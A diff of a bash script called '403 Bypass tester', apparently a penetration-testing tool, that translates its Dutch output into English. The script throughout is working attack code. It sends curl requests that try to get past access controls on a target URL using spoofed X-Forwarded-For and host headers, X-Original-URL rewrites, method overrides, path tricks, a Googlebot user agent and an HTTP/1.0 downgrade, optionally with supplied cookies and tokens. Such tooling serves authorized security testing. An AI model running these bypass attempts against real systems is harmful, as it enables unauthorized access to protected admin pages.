@@ -3,15 +3,15 @@
 set -uo pipefail
 
 usage() {
-    echo "Gebruik: bash $0 [opties] <URL>"
+    echo "Usage: bash $0 [options] <URL>"
     echo
-    echo "  --cookies, -c   Cookie-header in Burp-notatie, meerdere cookies gescheiden"
-    echo "                  door '; ' (bijv. \"csrftoken=abc; session=def\")."
-    echo "  --header, -H    Extra header, meegegeven zoals bij curl (bijv."
-    echo "                  \"Authorization: Bearer eyJ...\"). Mag meerdere keren."
-    echo "  <URL>           De doel-URL, bijv. https://target.tld/admin"
+    echo "  --cookies, -c   Cookie header in Burp notation, multiple cookies separated"
+    echo "                  by '; ' (e.g. \"csrftoken=abc; session=def\")."
+    echo "  --header, -H    Extra header, passed like curl does (e.g."
+    echo "                  \"Authorization: Bearer eyJ...\"). May be repeated."
+    echo "  <URL>           The target URL, e.g. https://target.tld/admin"
     echo
-    echo "Voorbeeld:"
+    echo "Example:"
     echo "  bash $0 -H \"Authorization: Bearer eyJ...\" -H \"X-Api-Key: abc\" https://target.tld/admin"
     exit 1
 }
@@ -23,7 +23,7 @@ EXTRA_HEADERS=()
 while [[ $# -gt 0 ]]; do
     case "$1" in
         --cookies|-c)
-            [[ $# -lt 2 ]] && { echo "Fout: $1 verwacht een waarde."; usage; }
+            [[ $# -lt 2 ]] && { echo "Error: $1 requires a value."; usage; }
             COOKIES="$2"
             shift 2
             ;;
@@ -32,7 +32,7 @@ while [[ $# -gt 0 ]]; do
             shift
             ;;
         --header|-H)
-            [[ $# -lt 2 ]] && { echo "Fout: $1 verwacht een waarde."; usage; }
+            [[ $# -lt 2 ]] && { echo "Error: $1 requires a value."; usage; }
             EXTRA_HEADERS+=("$2")
             shift 2
             ;;
@@ -44,14 +44,14 @@ while [[ $# -gt 0 ]]; do
             usage
             ;;
         -*)
-            echo "Onbekende optie: $1"
+            echo "Unknown option: $1"
             usage
             ;;
         *)
             if [[ -z "$RAW_URL" ]]; then
                 RAW_URL="$1"
             else
-                echo "Onverwacht extra argument: $1"
+                echo "Unexpected extra argument: $1"
                 usage
             fi
             shift
@@ -59,17 +59,14 @@ while [[ $# -gt 0 ]]; do
     esac
 done
 
-[[ -z "$RAW_URL" ]] && { echo "Fout: geen URL opgegeven."; usage; }
-
+[[ -z "$RAW_URL" ]] && { echo "Error: no URL provided."; usage; }
 
 CURL_OPTS=(-s -k -o /dev/null -m 10 --max-redirs 0)
-
 
 if [[ -n "$COOKIES" ]]; then
     CURL_OPTS+=(-b "$COOKIES")
 fi
 
-# Extra headers toevoegen aan elk request
 if [[ ${#EXTRA_HEADERS[@]} -gt 0 ]]; then
     for _h in "${EXTRA_HEADERS[@]}"; do
         CURL_OPTS+=(-H "$_h")
@@ -79,9 +76,7 @@ fi
 SCHEME_HOST="$(echo "$RAW_URL" | grep -oE '^https?://[^/]+')"
 PATH_PART="${RAW_URL#$SCHEME_HOST}"
 [[ -z "$PATH_PART" ]] && PATH_PART="/"
-
 [[ "$PATH_PART" != /* ]] && PATH_PART="/$PATH_PART"
-
 CLEAN_PATH="${PATH_PART%/}"
 [[ -z "$CLEAN_PATH" ]] && CLEAN_PATH="/"
 
@@ -89,18 +84,18 @@ GREEN='\033[0;32m'; YELLOW='\033[0;33m'; RED='\033[0;31m'; CYAN='\033[0;36m'; NC
 
 echo -e "${CYAN}==========================================================${NC}"
 echo -e "${CYAN} 403 Bypass tester${NC}"
-echo -e "${CYAN} Doel-URL : ${NC}$RAW_URL"
-echo -e "${CYAN} Base     : ${NC}$SCHEME_HOST"
-echo -e "${CYAN} Pad      : ${NC}$PATH_PART"
+echo -e "${CYAN} Target URL : ${NC}$RAW_URL"
+echo -e "${CYAN} Base       : ${NC}$SCHEME_HOST"
+echo -e "${CYAN} Path       : ${NC}$PATH_PART"
 if [[ -n "$COOKIES" ]]; then
-    echo -e "${CYAN} Cookies  : ${NC}${GREEN}actief${NC} (geauthenticeerd testen)"
+    echo -e "${CYAN} Cookies    : ${NC}${GREEN}active${NC} (authenticated testing)"
 else
-    echo -e "${CYAN} Cookies  : ${NC}geen (anoniem)"
+    echo -e "${CYAN} Cookies    : ${NC}none (anonymous)"
 fi
 if [[ ${#EXTRA_HEADERS[@]} -gt 0 ]]; then
-    echo -e "${CYAN} Headers  : ${NC}${GREEN}${#EXTRA_HEADERS[@]} extra${NC} meegegeven"
+    echo -e "${CYAN} Headers    : ${NC}${GREEN}${#EXTRA_HEADERS[@]} extra${NC} provided"
     for _h in "${EXTRA_HEADERS[@]}"; do
-        echo -e "${CYAN}          + ${NC}$_h"
+        echo -e "${CYAN}           + ${NC}$_h"
     done
 fi
 echo -e "${CYAN}==========================================================${NC}"
@@ -108,24 +103,21 @@ echo -e "${CYAN}==========================================================${NC}"
 run() {
     local label="$1"; shift
     local code size
-    
     read -r code size < <(curl "${CURL_OPTS[@]}" -w '%{http_code} %{size_download}' "$@")
     local color="$YELLOW"
     case "$code" in
-        2*) color="$GREEN" ;;       
-        403|401) color="$RED" ;;    
-        3*) color="$CYAN" ;;       
+        2*) color="$GREEN" ;;
+        403|401) color="$RED" ;;
+        3*) color="$CYAN" ;;
         *) color="$YELLOW" ;;
     esac
     printf "  [${color}%s${NC}] %-8s %s\n" "$code" "(${size}b)" "$label"
 }
 
-
 echo -e "\n${CYAN}[*] Baseline${NC}"
 run "GET $PATH_PART" "$SCHEME_HOST$PATH_PART"
 
-
-echo -e "\n${CYAN}[*] Header-injectie (spoofed IP / host)${NC}"
+echo -e "\n${CYAN}[*] Header injection (spoofed IP / host)${NC}"
 
 HEADERS=(
     "X-Forwarded-For: 127.0.0.1"
@@ -163,26 +155,21 @@ for h in "${HEADERS[@]}"; do
     run "$h" -H "$h" "$SCHEME_HOST$PATH_PART"
 done
 
+echo -e "\n${CYAN}[*] X-Original-URL / X-Rewrite-URL to root${NC}"
+run "X-Original-URL: $PATH_PART (to /)"  -H "X-Original-URL: $PATH_PART"  "$SCHEME_HOST/"
+run "X-Rewrite-URL: $PATH_PART (to /)"   -H "X-Rewrite-URL: $PATH_PART"   "$SCHEME_HOST/"
 
-echo -e "\n${CYAN}[*] X-Original-URL / X-Rewrite-URL naar root${NC}"
-run "X-Original-URL: $PATH_PART (naar /)"  -H "X-Original-URL: $PATH_PART"  "$SCHEME_HOST/"
-run "X-Rewrite-URL: $PATH_PART (naar /)"   -H "X-Rewrite-URL: $PATH_PART"   "$SCHEME_HOST/"
-
-
-echo -e "\n${CYAN}[*] Alternatieve HTTP-methoden${NC}"
+echo -e "\n${CYAN}[*] Alternative HTTP methods${NC}"
 for m in GET POST HEAD OPTIONS PUT DELETE PATCH TRACE CONNECT; do
     run "$m" -X "$m" "$SCHEME_HOST$PATH_PART"
 done
-
 
 echo -e "\n${CYAN}[*] Method-override headers${NC}"
 run "X-HTTP-Method-Override: GET"       -H "X-HTTP-Method-Override: GET"       -X POST "$SCHEME_HOST$PATH_PART"
 run "X-HTTP-Method: GET"                -H "X-HTTP-Method: GET"                -X POST "$SCHEME_HOST$PATH_PART"
 run "X-Method-Override: GET"            -H "X-Method-Override: GET"            -X POST "$SCHEME_HOST$PATH_PART"
 
-
-echo -e "\n${CYAN}[*] Path-manipulatie${NC}"
-
+echo -e "\n${CYAN}[*] Path manipulation${NC}"
 
 PATHS=(
     "$CLEAN_PATH/"
@@ -212,27 +199,23 @@ PATHS=(
 )
 
 for p in "${PATHS[@]}"; do
-   
     url="$SCHEME_HOST$(echo "$p" | sed 's#^//*#/#')"
     run "$p" "$url"
 done
 
-
 if [[ "$CLEAN_PATH" =~ [a-zA-Z] ]]; then
-    echo -e "\n${CYAN}[*] Case-variatie${NC}"
+    echo -e "\n${CYAN}[*] Case variation${NC}"
     UPPER="$(echo "$CLEAN_PATH" | tr '[:lower:]' '[:upper:]')"
     run "UPPERCASE: $UPPER" "$SCHEME_HOST$UPPER"
 fi
 
-
-echo -e "\n${CYAN}[*] User-Agent varianten${NC}"
+echo -e "\n${CYAN}[*] User-Agent variants${NC}"
 run "UA: Googlebot"        -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "$SCHEME_HOST$PATH_PART"
-run "UA: leeg"             -A "" "$SCHEME_HOST$PATH_PART"
+run "UA: empty"            -A "" "$SCHEME_HOST$PATH_PART"
 
-# HTTP/1.0 downgrade
-echo -e "\n${CYAN}[*] Protocol-downgrade${NC}"
+echo -e "\n${CYAN}[*] Protocol downgrade${NC}"
 run "HTTP/1.0" --http1.0 "$SCHEME_HOST$PATH_PART"
 
 echo -e "\n${CYAN}==========================================================${NC}"
-echo -e "${GREEN}Klaar.${NC} Let op ${GREEN}2xx${NC}-codes of afwijkende response-groottes: dat zijn kandidaat-bypasses."
+echo -e "${GREEN}Done.${NC} Watch for ${GREEN}2xx${NC} codes or unusual response sizes: those are candidate bypasses."
 echo -e "${CYAN}==========================================================${NC}"
